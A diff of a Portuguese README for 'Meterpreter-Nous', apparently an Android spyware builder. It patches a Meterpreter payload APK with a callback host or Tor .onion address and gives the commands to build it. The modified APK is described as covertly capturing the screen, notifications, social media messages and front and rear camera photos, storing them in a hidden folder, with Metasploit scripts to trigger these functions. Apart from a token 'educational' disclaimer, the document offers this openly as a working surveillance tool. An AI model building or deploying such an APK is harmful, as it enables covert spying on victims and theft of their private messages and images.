@@ -1,97 +1,79 @@
+# **Meterpreter-Nous**  
+
+![Logo](https://raw.githubusercontent.com/mikelkarma/Meterpreter-Nous/refs/heads/main/screenshot.png)  
+
+**Meterpreter-Nous** é um script que modifica e recompila um APK, permitindo configurar conexões dinâmicas com ou sem o uso de Tor.  
 
 ---
 
-# Meterpreter-Nous
+## **Funcionalidades**  
 
-![Logo](https://raw.githubusercontent.com/mikelkarma/Meterpreter-Nous/refs/heads/main/screenshot.png)
-
-
-*"Hack the system. Reconfigure. Adapt. Overcome."*
-
-Este script modifica e compila um APK personalizado, permitindo configurar conexões dinâmicas com ou sem o uso de Tor.
+- Modifica o arquivo `Payload.smali` para definir um novo **host** e **porta**.  
+- Suporte a hosts `.onion` para conexões via **Tor**.  
+- Compilação automatizada do APK modificado.  
 
 ---
 
-## [ SYSTEM CORE ]
+## **Requisitos**  
 
-- Modifica o arquivo `Payload.smali` para definir um novo **host** e **porta**.
-- Suporte completo a hosts `.onion` para conexões sigilosas via **Tor**.
-- Compilação automatizada do APK modificado.
+Certifique-se de ter os seguintes componentes instalados:  
 
----
-
-## [ SYSTEM REQUIREMENTS ]
-
-Certifique-se de possuir as ferramentas essenciais:
-
-- [Python 3.x](https://www.python.org/)
-- [apktool](https://github.com/iBotPeaches/Apktool)
-- [Java](https://www.java.com/)
+- [Python 3.x](https://www.python.org/)  
+- [apktool](https://github.com/iBotPeaches/Apktool)  
+- [Java](https://www.java.com/)  
 
 ---
 
-## [ INSTALL & DEPLOY ]
+## **Instalação**  
 
-Clone o repositório e navegue até o diretório:
+Clone o repositório e acesse o diretório:  
 
-```bash
-git clone https://github.com/mikelkarma/Meterpreter-Nous
-cd Meterpreter-Nous
-sh install.sh # Debian
-```
-
-## [ EXECUTION MODE ]
-
-Defina o host e a porta diretamente na CLI:
-
-```bash
-python nous.py --host <IP ou domínio> --porta <porta> --tor <true/false>
-```
-
-Exemplos de execução:
-
-**1. Configuração de um host sem Tor:**
-
-```bash
-python nous.py --host 192.168.0.1 --porta 8080 --tor false
-```
-
-**2. Configuração de um host .onion com Tor:**
-
-```bash
-python nous.py --host exemplo.onion --porta 8080 --tor true
-```
+- git clone https://github.com/mikelkarma/Meterpreter-Nous  
+- cd Meterpreter-Nous  
+- sh install.sh # Para sistemas Debian  
 
 ---
 
-## [ MOD APK CAPABILITIES ]
+## **Uso**  
 
-Este APK possui capacidades avançadas, incluindo:
+Defina o host e a porta diretamente na linha de comando:  
 
-- Monitoramento em tempo real da tela do Android.
-- Captura de notificações de redes sociais e outros aplicativos.
+- python nous.py --host <IP ou domínio> --porta <porta> --tor <true/false>  
 
-Os scripts necessários para ativar essas funções no Metasploit estão disponíveis em `msf-scripts`. Copie-os para o seu ambiente Metasploit e execute na sessão desejada:
+Exemplos:  
 
-```bash
-meterpreter> run <script>
-```
+1. Configuração de um host sem Tor:  
 
----
+   - python nous.py --host 192.168.0.1 --porta 8080 --tor false  
 
-> "No system is safe. The only real security is obscurity."
+2. Configuração de um host `.onion` com Tor:  
 
----
-
-## [ DISCLAIMER ]
-
-Este código é disponibilizado apenas para fins educacionais e de pesquisa.
-
-- Não há qualquer garantia de funcionamento ou segurança.
-- O uso deste código é de total responsabilidade do usuário.
-- Não me responsabilizo por qualquer uso indevido, ilegal ou mal-intencionado deste software.
-
-Se optar por utilizar este código, faça-o de maneira ética e dentro dos limites da lei.
+   - python nous.py --host exemplo.onion --porta 8080 --tor true  
 
 ---
 
+## **Recursos do APK Modificado**  
+
+O APK gerado possui funcionalidades como:  
+
+- Captura de tela em tempo real.  
+- Monitoramento de notificações de aplicativos.  
+- Captura de textos exibidos na tela, permitindo registrar mensagens de redes sociais.  
+- Armazenamento das mensagens capturadas no diretório `/sdcard/.nous/key.sql`.  
+- Captura de imagens da câmera frontal e traseira ao criar os arquivos `web1` e `web2` no diretório `/sdcard/.nous/`, gerando as imagens em `.photo.nous`.  
+
+Os scripts para ativação dessas funções no Metasploit estão disponíveis em `msf-scripts`. Para utilizá-los, copie-os para o seu ambiente e execute:  
+
+- meterpreter> run <script>  
+
+---
+
+## **Aviso Legal**  
+
+Este código é disponibilizado exclusivamente para fins educacionais e de pesquisa.  
+
+- Não há garantias de funcionamento ou segurança.  
+- O uso deste código é de responsabilidade do usuário.  
+- O autor não se responsabiliza por qualquer uso indevido ou ilegal deste software.  
+
+Utilize este código de maneira ética e dentro dos limites da lei.
